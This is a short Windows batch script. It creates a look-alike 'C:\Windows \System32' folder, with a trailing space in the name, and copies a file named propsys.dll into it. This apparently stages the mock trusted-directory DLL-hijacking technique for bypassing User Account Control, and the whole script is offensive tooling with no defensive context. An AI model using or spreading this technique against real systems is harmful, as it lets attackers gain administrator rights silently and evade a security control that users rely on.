@echo off



mkdir "\\?\C:\Windows " 

mkdir "\\?\C:\Windows \System32"

echo  [+] file copying ...

copy "propsys.dll" "C:\Windows \System32\"


echo  [-] .dll placed





@echo off